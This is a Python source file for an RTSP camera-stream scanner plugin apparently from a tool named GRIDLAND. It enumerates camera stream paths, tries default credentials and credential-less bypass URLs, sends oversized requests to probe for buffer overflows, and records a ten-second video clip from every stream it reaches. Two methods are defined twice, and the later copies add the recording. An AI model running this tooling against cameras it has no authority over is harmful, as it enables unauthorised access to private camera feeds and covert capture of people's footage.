"""
RTSP Stream Authentication Scanner Plugin

Comprehensive RTSP stream vulnerability detection including:
- Authentication bypass testing
- Default credential detection for RTSP streams
- Stream enumeration and discovery
- Protocol-specific exploits
- Codec and format analysis
"""

import asyncio
import socket
import ssl
import base64
import hashlib
import re
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, quote

from gridland.analyze.plugins.manager import StreamPlugin, PluginMetadata
from gridland.analyze.memory import get_memory_pool
from gridland.core.logger import get_logger
from gridland.core.config import get_config
import os
import time

logger = get_logger(__name__)


class RTSPStreamScanner(StreamPlugin):
    """Professional RTSP stream vulnerability scanner."""
    
    def __init__(self):
        super().__init__()
        self.metadata = PluginMetadata(
            name="RTSP Stream Scanner",
            version="1.0.1",
            author="GRIDLAND Security Team",
            plugin_type="stream",
            supported_ports=[554, 8554, 1935, 80, 443, 8080],
            supported_services=["rtsp", "rtsps", "http", "https"],
            description="Comprehensive RTSP stream vulnerability scanner"
        )
        self.memory_pool = get_memory_pool()
        
        # Common RTSP default credentials
        self.default_credentials = [
            ('admin', 'admin'),
            ('admin', '123456'),
            ('admin', 'password'),
            ('admin', ''),
            ('root', 'root'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('admin', '12345'),
            ('admin', 'admin123'),
            ('camera', 'camera'),
            ('live', 'live'),
            ('stream', 'stream'),
        ]
        
        # Common RTSP stream paths, enhanced with CamXploit data
        self.stream_paths = [
            # Generic paths from CamXploit
            '/live.sdp', '/h264.sdp', '/stream1', '/stream2', '/main', '/sub',
            '/video', '/cam/realmonitor', '/Streaming/Channels/1', '/Streaming/Channels/101',
            # Original paths
            '/live', '/live/0', '/live/1', '/live/ch1', '/live/ch01', '/live/main', '/live/sub',
            '/stream', '/stream/0', '/stream/1', '/stream/main', '/stream/sub',
            '/video/0', '/video/1', '/cam', '/cam/playback', '/media', '/media/video1',
            '/media/video2', '/axis-media/media.amp', '/MediaInput/h264', '/MediaInput/mpeg4',
            # Brand-specific paths from CamXploit
            '/onvif/streaming/channels/1',  # ONVIF
            '/axis-cgi/mjpg/video.cgi',  # Axis
            '/cgi-bin/mjpg/video.cgi',  # Generic
            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
            '/cgi-bin/snapshot.cgi',  # Generic
            '/cgi-bin/viewer/video.jpg',  # Generic
            '/img/snapshot.cgi',  # Generic
            '/snapshot.jpg',  # Generic
            '/video/mjpg.cgi',  # Generic
            '/video.cgi',  # Generic
            '/videostream.cgi',  # Generic
            '/mjpg/video.mjpg',  # Generic
            '/mjpg.cgi',  # Generic
            '/stream.cgi',  # Generic
            '/live.cgi',  # Generic
            '/live/0/onvif.sdp',  # ONVIF
            '/live/0/h264.sdp',  # Generic
            '/live/0/mpeg4.sdp',  # Generic
            '/live/0/audio.sdp',  # Generic
            '/live/1/onvif.sdp',  # ONVIF
            '/live/1/h264.sdp',  # Generic
            '/live/1/mpeg4.sdp',  # Generic
            '/live/1/audio.sdp',  # Generic
            # PSIA/ISAPI paths
            '/PSIA/streaming/channels/1',
            '/PSIA/streaming/channels/101',
            '/ISAPI/streaming/channels/1',
            '/ISAPI/streaming/channels/101',
        ]
        
        # RTSP response patterns for different camera types
        self.camera_signatures = {
            'hikvision': ['hikvision', 'ds-', 'hik'],
            'dahua': ['dahua', 'dh-', 'ipc-'],
            'axis': ['axis', 'vapix'],
            'sony': ['sony', 'snc-'],
            'bosch': ['bosch', 'nbc-'],
            'panasonic': ['panasonic', 'wv-'],
            'samsung': ['samsung', 'snp-'],
            'vivotek': ['vivotek', 'ip'],
            'foscam': ['foscam', 'fi'],
            'generic': ['camera', 'ipcam', 'webcam']
        }
        
        # RTSP methods to test
        self.rtsp_methods = [
            'OPTIONS',
            'DESCRIBE',
            'SETUP',
            'PLAY',
            'PAUSE',
            'TEARDOWN',
            'GET_PARAMETER',
            'SET_PARAMETER'
        ]
    
    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata."""
        return self.metadata
    
    async def analyze_streams(self, target_ip: str, target_port: int, 
                             service: str, banner: str) -> List[Any]:
        """
        Scan for RTSP stream vulnerabilities.
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            service: Service type
            banner: Service banner
            
        Returns:
            List of StreamResult objects
        """
        results = []
        
        try:
            # Test RTSP on common ports
            if target_port in [554, 8554] or service.lower().startswith('rtsp'):
                rtsp_results = await self._scan_rtsp_direct(target_ip, target_port)
                results.extend(rtsp_results)
            
            # Test RTSP over HTTP tunnel
            if target_port in [80, 443, 8080] and service.lower().startswith('http'):
                http_rtsp_results = await self._scan_rtsp_over_http(target_ip, target_port, service)
                results.extend(http_rtsp_results)
            
        except Exception as e:
            logger.warning(f"Error scanning RTSP streams on {target_ip}:{target_port}: {e}")
        
        return results
    
    async def _scan_rtsp_direct(self, target_ip: str, target_port: int) -> List[Any]:
        """Scan RTSP directly on RTSP ports."""
        results = []
        
        # Test unauthenticated access first
        unauth_streams = await self._test_unauthenticated_streams(target_ip, target_port)
        results.extend(unauth_streams)
        
        # Test with default credentials
        auth_streams = await self._test_authenticated_streams(target_ip, target_port)
        results.extend(auth_streams)
        
        # Test for RTSP vulnerabilities
        vuln_streams = await self._test_rtsp_vulnerabilities(target_ip, target_port)
        results.extend(vuln_streams)
        
        return results
    
    async def _scan_rtsp_over_http(self, target_ip: str, target_port: int, service: str) -> List[Any]:
        """Scan for RTSP streams tunneled over HTTP."""
        results = []
        
        protocol = 'https' if service == 'https' or target_port == 443 else 'http'
        
        # Common HTTP-based streaming endpoints
        http_stream_paths = [
            '/videostream.cgi',
            '/video.cgi',
            '/mjpeg.cgi',
            '/snapshot.cgi',
            '/live.cgi',
            '/cgi-bin/viewer/video.jpg',
            '/axis-cgi/mjpg/video.cgi',
            '/ISAPI/streaming/channels/1/httppreview',
            '/cgi-bin/hi3510/mjpeg.cgi',
            '/web/tmpfs/auto.jpg',
        ]
        
        for path in http_stream_paths:
            try:
                stream_url = f"{protocol}://{target_ip}:{target_port}{path}"
                
                # Test unauthenticated access
                accessible = await self._test_http_stream_access(stream_url)
                if accessible:
                    stream = self.memory_pool.acquire_stream_result()
                    stream.ip = target_ip
                    stream.port = target_port
                    stream.protocol = "HTTP"
                    stream.stream_url = stream_url
                    stream.accessible = True
                    stream.authenticated = False
                    results.append(stream)
                    continue
                
                # Test with credentials
                for username, password in self.default_credentials:
                    auth_accessible = await self._test_http_stream_auth(stream_url, username, password)
                    if auth_accessible:
                        stream = self.memory_pool.acquire_stream_result()
                        stream.ip = target_ip
                        stream.port = target_port
                        stream.protocol = "HTTP"
                        stream.stream_url = stream_url
                        stream.accessible = True
                        stream.authenticated = True
                        results.append(stream)
                        break
                        
            except Exception as e:
                logger.debug(f"HTTP stream test error for {path}: {e}")
                continue
        
        return results
    
    async def _test_unauthenticated_streams(self, target_ip: str, target_port: int) -> List[Any]:
        """Test for unauthenticated RTSP streams."""
        results = []
        
        for path in self.stream_paths:
            try:
                stream_url = f"rtsp://{target_ip}:{target_port}{path}"
                
                # Test RTSP connection without authentication
                accessible, stream_info = await self._test_rtsp_connection(stream_url)
                if accessible:
                    stream = self.memory_pool.acquire_stream_result()
                    stream.ip = target_ip
                    stream.port = target_port
                    stream.protocol = "RTSP"
                    stream.stream_url = stream_url
                    stream.accessible = True
                    stream.authenticated = False
                    
                    # Extract stream information
                    if stream_info:
                        stream.codec = stream_info.get('codec', '')
                        stream.resolution = stream_info.get('resolution', '')
                        stream.fps = stream_info.get('fps', 0)
                    
                    results.append(stream)
                    
            except Exception as e:
                logger.debug(f"Unauthenticated RTSP test error for {path}: {e}")
                continue
        
        return results
    
    async def _test_authenticated_streams(self, target_ip: str, target_port: int) -> List[Any]:
        """Test RTSP streams with default credentials."""
        results = []
        
        for username, password in self.default_credentials:
            for path in self.stream_paths:
                try:
                    stream_url = f"rtsp://{username}:{password}@{target_ip}:{target_port}{path}"
                    
                    # Test RTSP connection with authentication
                    accessible, stream_info = await self._test_rtsp_connection(stream_url)
                    if accessible:
                        stream = self.memory_pool.acquire_stream_result()
                        stream.ip = target_ip
                        stream.port = target_port
                        stream.protocol = "RTSP"
                        stream.stream_url = stream_url
                        stream.accessible = True
                        stream.authenticated = True
                        
                        # Extract stream information
                        if stream_info:
                            stream.codec = stream_info.get('codec', '')
                            stream.resolution = stream_info.get('resolution', '')
                            stream.fps = stream_info.get('fps', 0)
                        
                        results.append(stream)
                        return results  # Found working credentials, stop testing
                        
                except Exception as e:
                    logger.debug(f"Authenticated RTSP test error for {username}:{password}@{path}: {e}")
                    continue
        
        return results
    
    async def _test_rtsp_vulnerabilities(self, target_ip: str, target_port: int) -> List[Any]:
        """Test for RTSP protocol vulnerabilities."""
        results = []
        
        try:
            # Test for buffer overflow vulnerabilities
            overflow_result = await self._test_rtsp_buffer_overflow(target_ip, target_port)
            if overflow_result:
                results.append(overflow_result)
            
            # Test for authentication bypass
            bypass_result = await self._test_rtsp_auth_bypass(target_ip, target_port)
            if bypass_result:
                results.append(bypass_result)
            
            # Test for information disclosure
            info_result = await self._test_rtsp_info_disclosure(target_ip, target_port)
            if info_result:
                results.append(info_result)
                
        except Exception as e:
            logger.debug(f"RTSP vulnerability test error: {e}")
        
        return results
    
    async def _test_rtsp_connection(self, stream_url: str) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """Test RTSP connection and extract stream information."""
        try:
            # Parse URL
            parsed = urlparse(stream_url)
            host = parsed.hostname
            port = parsed.port or 554
            path = parsed.path or '/'
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                await asyncio.get_event_loop().run_in_executor(None, sock.connect, (host, port))
                
                # Send OPTIONS request
                options_request = f"OPTIONS {stream_url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: GRIDLAND Scanner\r\n\r\n"
                sock.send(options_request.encode())
                
                # Receive response
                response = sock.recv(4096).decode('utf-8', errors='ignore')
                
                if 'RTSP/1.0 200 OK' in response:
                    # Send DESCRIBE request to get stream info
                    describe_request = f"DESCRIBE {stream_url} RTSP/1.0\r\nCSeq: 2\r\nUser-Agent: GRIDLAND Scanner\r\nAccept: application/sdp\r\n\r\n"
                    sock.send(describe_request.encode())
                    
                    describe_response = sock.recv(4096).decode('utf-8', errors='ignore')
                    
                    stream_info = self._parse_sdp_info(describe_response)
                    return True, stream_info
                
                return False, None
                
            finally:
                sock.close()
                
        except Exception as e:
            logger.debug(f"RTSP connection test error: {e}")
            return False, None
    
    def _parse_sdp_info(self, sdp_response: str) -> Dict[str, Any]:
        """Parse SDP information from RTSP DESCRIBE response."""
        info = {}
        
        try:
            # Extract codec information
            codec_match = re.search(r'a=rtpmap:\d+\s+(\w+)', sdp_response, re.IGNORECASE)
            if codec_match:
                info['codec'] = codec_match.group(1).upper()
            
            # Extract framerate
            fps_match = re.search(r'a=framerate:(\d+(?:\.\d+)?)', sdp_response, re.IGNORECASE)
            if fps_match:
                info['fps'] = int(float(fps_match.group(1)))
            
            # Extract resolution (if available in SDP)
            # Note: Resolution is often not in SDP, would need to analyze actual stream
            res_match = re.search(r'(\d{3,4})x(\d{3,4})', sdp_response)
            if res_match:
                info['resolution'] = f"{res_match.group(1)}x{res_match.group(2)}"
                
        except Exception as e:
            logger.debug(f"SDP parsing error: {e}")
        
        return info
    
    async def _test_http_stream_access(self, stream_url: str) -> bool:
        """Test HTTP-based stream access."""
        try:
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=5)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                async with session.get(stream_url) as response:
                    # Check for successful stream access
                    if response.status == 200:
                        content_type = response.headers.get('content-type', '').lower()
                        return any(stream_type in content_type for stream_type in 
                                  ['image/', 'video/', 'multipart/', 'application/octet-stream'])
                    
        except Exception as e:
            logger.debug(f"HTTP stream access test error: {e}")
        
        return False
    
    async def _test_http_stream_auth(self, stream_url: str, username: str, password: str) -> bool:
        """Test HTTP stream with authentication."""
        try:
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=5)
            connector = aiohttp.TCPConnector(ssl=False)
            auth = aiohttp.BasicAuth(username, password)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                async with session.get(stream_url, auth=auth) as response:
                    if response.status == 200:
                        content_type = response.headers.get('content-type', '').lower()
                        return any(stream_type in content_type for stream_type in 
                                  ['image/', 'video/', 'multipart/', 'application/octet-stream'])
                    
        except Exception as e:
            logger.debug(f"HTTP stream auth test error: {e}")
        
        return False
    
    async def _test_rtsp_buffer_overflow(self, target_ip: str, target_port: int) -> Optional[Any]:
        """Test for RTSP buffer overflow vulnerabilities."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                await asyncio.get_event_loop().run_in_executor(None, sock.connect, (target_ip, target_port))
                
                # Send oversized request to test for buffer overflow
                overflow_request = f"OPTIONS rtsp://{target_ip}:{target_port}/{'A' * 2048} RTSP/1.0\r\nCSeq: 1\r\n{'X' * 4096}\r\n\r\n"
                sock.send(overflow_request.encode())
                
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                # Check for crash indicators or unusual responses
                if not response or '500' in response or '400' in response:
                    stream = self.memory_pool.acquire_stream_result()
                    stream.ip = target_ip
                    stream.port = target_port
                    stream.protocol = "RTSP"
                    stream.stream_url = f"rtsp://{target_ip}:{target_port}/vuln"
                    stream.accessible = False
                    stream.authenticated = False
                    return stream
                    
            finally:
                sock.close()
                
        except Exception as e:
            logger.debug(f"RTSP buffer overflow test error: {e}")
        
        return None
    
    async def _test_rtsp_auth_bypass(self, target_ip: str, target_port: int) -> Optional[Any]:
        """Test for RTSP authentication bypass vulnerabilities."""
        try:
            # Test with malformed authentication header
            bypass_urls = [
                f"rtsp://admin@{target_ip}:{target_port}/live",
                f"rtsp://:@{target_ip}:{target_port}/live",
                f"rtsp://admin:@{target_ip}:{target_port}/live",
            ]
            
            for url in bypass_urls:
                accessible, _ = await self._test_rtsp_connection(url)
                if accessible:
                    stream = self.memory_pool.acquire_stream_result()
                    stream.ip = target_ip
                    stream.port = target_port
                    stream.protocol = "RTSP"
                    stream.stream_url = url
                    stream.accessible = True
                    stream.authenticated = False
                    return stream
                    
        except Exception as e:
            logger.debug(f"RTSP auth bypass test error: {e}")
        
        return None
    
    async def _test_rtsp_info_disclosure(self, target_ip: str, target_port: int) -> Optional[Any]:
        """Test for RTSP information disclosure vulnerabilities."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                await asyncio.get_event_loop().run_in_executor(None, sock.connect, (target_ip, target_port))
                
                # Send GET_PARAMETER request to extract server information
                info_request = f"GET_PARAMETER rtsp://{target_ip}:{target_port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
                sock.send(info_request.encode())
                
                response = sock.recv(4096).decode('utf-8', errors='ignore')
                
                # Check for information disclosure in response
                sensitive_info = ['server:', 'user-agent:', 'version', 'model', 'serial']
                if any(info in response.lower() for info in sensitive_info):
                    stream = self.memory_pool.acquire_stream_result()
                    stream.ip = target_ip
                    stream.port = target_port
                    stream.protocol = "RTSP"
                    stream.stream_url = f"rtsp://{target_ip}:{target_port}/"
                    stream.accessible = True
                    stream.authenticated = False
                    return stream
                    
            finally:
                sock.close()
                
        except Exception as e:
            logger.debug(f"RTSP info disclosure test error: {e}")
        
        return None


    async def _capture_stream_clip(self, stream_url: str, target_ip: str, target_port: int) -> Optional[str]:
        """
        Records a short clip from an RTSP stream using ffmpeg.
        """
        import ffmpeg

        config = get_config()
        recordings_dir = config.output.get('recordings', 'recordings')
        os.makedirs(recordings_dir, exist_ok=True)

        filename = f"{target_ip.replace('.', '_')}_{target_port}_{int(time.time())}.mp4"
        output_path = os.path.join(recordings_dir, filename)

        try:
            logger.info(f"Attempting to record stream from {stream_url}")
            (
                ffmpeg
                .input(stream_url, rtsp_transport='tcp', timeout=5000000)
                .output(output_path, vcodec='copy', acodec='copy', t=10)
                .overwrite_output()
                .run(capture_stdout=True, capture_stderr=True)
            )
            logger.info(f"Successfully recorded stream to {output_path}")
            return output_path
        except ffmpeg.Error as e:
            logger.error(f"Failed to record stream from {stream_url}: {e.stderr.decode()}")
            return None
        except Exception as e:
            logger.error(f"An unexpected error occurred during stream recording: {e}")
            return None

    async def _test_unauthenticated_streams(self, target_ip: str, target_port: int) -> List[Any]:
        """Test for unauthenticated RTSP streams."""
        results = []

        for path in self.stream_paths:
            try:
                stream_url = f"rtsp://{target_ip}:{target_port}{path}"

                # Test RTSP connection without authentication
                accessible, stream_info = await self._test_rtsp_connection(stream_url)
                if accessible:
                    stream = self.memory_pool.acquire_stream_result()
                    stream.ip = target_ip
                    stream.port = target_port
                    stream.protocol = "RTSP"
                    stream.stream_url = stream_url
                    stream.accessible = True
                    stream.authenticated = False

                    # Extract stream information
                    if stream_info:
                        stream.codec = stream_info.get('codec', '')
                        stream.resolution = stream_info.get('resolution', '')
                        stream.fps = stream_info.get('fps', 0)

                    # Capture a clip
                    video_path = await self._capture_stream_clip(stream_url, target_ip, target_port)
                    stream.metadata = {'video_capture_path': video_path}

                    results.append(stream)

            except Exception as e:
                logger.debug(f"Unauthenticated RTSP test error for {path}: {e}")
                continue

        return results

    async def _test_authenticated_streams(self, target_ip: str, target_port: int) -> List[Any]:
        """Test RTSP streams with default credentials."""
        results = []

        for username, password in self.default_credentials:
            for path in self.stream_paths:
                try:
                    stream_url = f"rtsp://{username}:{password}@{target_ip}:{target_port}{path}"

                    # Test RTSP connection with authentication
                    accessible, stream_info = await self._test_rtsp_connection(stream_url)
                    if accessible:
                        stream = self.memory_pool.acquire_stream_result()
                        stream.ip = target_ip
                        stream.port = target_port
                        stream.protocol = "RTSP"
                        stream.stream_url = stream_url
                        stream.accessible = True
                        stream.authenticated = True

                        # Extract stream information
                        if stream_info:
                            stream.codec = stream_info.get('codec', '')
                            stream.resolution = stream_info.get('resolution', '')
                            stream.fps = stream_info.get('fps', 0)

                        # Capture a clip
                        video_path = await self._capture_stream_clip(stream_url, target_ip, target_port)
                        stream.metadata = {'video_capture_path': video_path}

                        results.append(stream)
                        return results  # Found working credentials, stop testing

                except Exception as e:
                    logger.debug(f"Authenticated RTSP test error for {username}:{password}@{path}: {e}")
                    continue

        return results

# Plugin instance for automatic discovery
rtsp_stream_scanner = RTSPStreamScanner()